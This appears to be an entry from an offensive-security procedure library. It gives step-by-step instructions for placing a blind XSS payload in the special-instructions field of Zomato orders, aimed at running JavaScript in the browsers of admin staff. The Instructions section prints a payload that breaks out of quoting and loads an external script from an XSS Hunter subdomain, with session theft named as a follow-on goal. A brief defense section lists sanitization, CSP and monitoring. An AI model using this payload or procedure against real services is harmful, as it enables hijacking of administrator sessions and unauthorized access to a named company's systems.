---
id: proc-zomato-xss-inject-1
tags:
  - xss
  - injection
  - zomato
type: procedure
tools:
  - '[[tools/XSS-Hunter]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - Mobile App
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:30:58.386Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject XSS Payload into Zomato Order Special Instructions

## Summary

This procedure involves injecting a Blind XSS payload into the special instructions parameter of the Zomato order API during order placement, targeting execution in the admin dashboard when the order is reviewed.

## Description

The Zomato app's order API lacks proper sanitization for the special instructions field, allowing HTML and JavaScript injection. The payload is crafted to break out of any quoting and load an external script from XSS Hunter. This is a blind attack since execution occurs asynchronously in the admin context. Prerequisites include a Zomato user account and access to XSS Hunter for payload hosting.

## Requirements

1. Valid Zomato user account for placing orders
2. XSS Hunter account to generate unique payload subdomain
3. Mobile app or web access to Zomato order interface
4. Basic understanding of XSS payloads

## Defense

Defensive measures and detection strategies:

- Implement input sanitization and output encoding (e.g., HTML entity escaping) for user inputs in admin dashboards
- Use Content Security Policy (CSP) to block external script loads
- Monitor for anomalous script requests to external domains like xss.ht

## Objectives

1. Deliver XSS payload to admin-viewable order details
2. Achieve JavaScript execution in admin browser context
3. Enable potential follow-on attacks like session theft

## Instructions

### Step 1: Prepare XSS Hunter Payload

**Context**: Generate a trackable payload using XSS Hunter to host the external script.

No command required; access XSS Hunter dashboard to create a new hunt and obtain the payload template: `'><script src=https://{$handle}.xss.ht></script>`, replacing `{$handle}` with your unique subdomain.

> Expected output: Copy the full payload string for injection.

### Step 2: Place Order with Payload

**Context**: Use the Zomato app to submit an order, injecting the payload into the special instructions field.

Open the Zomato app, select items, proceed to checkout, and in the "Special Instructions" field, enter the payload. Complete the order placement.

> Expected output: Order confirmation with payload stored in the backend.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/XSS-Hunter]]

## Tags

- xss
- blind-xss
- injection
